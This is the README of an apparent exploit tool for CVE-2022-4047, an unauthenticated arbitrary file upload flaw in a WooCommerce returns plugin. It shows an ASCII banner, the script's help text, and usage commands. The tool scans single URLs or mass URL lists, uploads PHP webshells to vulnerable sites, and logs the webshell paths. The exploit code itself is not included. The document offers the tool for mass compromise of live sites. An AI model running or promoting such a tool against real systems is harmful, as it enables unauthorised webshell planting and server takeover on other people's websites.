# CVE-2022-4047

> Return Refund and Exchange For WooCommerce < 4.0.9 - Unauthenticated Arbitrary File Upload

## Usage

```
 @@@@@@@  @@@  @@@  @@@@@@@@              @@@@@@    @@@@@@@@    @@@@@@    @@@@@@                   @@@    @@@@@@@@        @@@   @@@@@@@@  
@@@@@@@@  @@@  @@@  @@@@@@@@             @@@@@@@@  @@@@@@@@@@  @@@@@@@@  @@@@@@@@                 @@@@   @@@@@@@@@@      @@@@   @@@@@@@@  
!@@       @@!  @@@  @@!                       @@@  @@!   @@@@       @@@       @@@                @@!@!   @@!   @@@@     @@!@!        @@!  
!@!       !@!  @!@  !@!                      @!@   !@!  @!@!@      @!@       @!@                !@!!@!   !@!  @!@!@    !@!!@!       !@!   
!@!       @!@  !@!  @!!!:!    @!@!@!@!@     !!@    @!@ @! !@!     !!@       !!@    @!@!@!@!@   @!! @!!   @!@ @! !@!   @!! @!!      @!!    
!!!       !@!  !!!  !!!!!:    !!!@!@!!!    !!:     !@!!!  !!!    !!:       !!:     !!!@!@!!!  !!!  !@!   !@!!!  !!!  !!!  !@!     !!!     
:!!       :!:  !!:  !!:                   !:!      !!:!   !!!   !:!       !:!                 :!!:!:!!:  !!:!   !!!  :!!:!:!!:   !!:      
:!:        ::!!:!   :!:                  :!:       :!:    !:!  :!:       :!:                  !:::!!:::  :!:    !:!  !:::!!:::  :!:       
 ::: :::    ::::     :: ::::             :: :::::  ::::::: ::  :: :::::  :: :::::                  :::   ::::::: ::       :::    ::       
 :: :: :     :      : :: ::              :: : :::   : : :  :   :: : :::  :: : :::                  :::    : : :  :        :::   : :       
                                                                                                                                          

usage: exploit.py [-h] [-u URL] [-f FILE]

CVE-2022-4047 - Return Refund and Exchange For WooCommerce < 4.0.9 - Unauthenticated Arbitrary File Upload (Mass PHP File Upload)

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     url
  -f FILE, --file FILE  url list
```

* Remeber to install `requests`
    * `pip3 install requests`
* `python3 exploit.py -u url`
* `python3 exploit.py -f file_path`
* Results for both types mentioned above will be saved in either vuln.txt or novuln.txt. If the target is found to be vulnerable, the path to the webshell will be recorded in uploaded.txt.
* Just a note: I have set up a proxy on port 8080 for easier monitoring of the situation, so remember to turn on your burp suite XD. 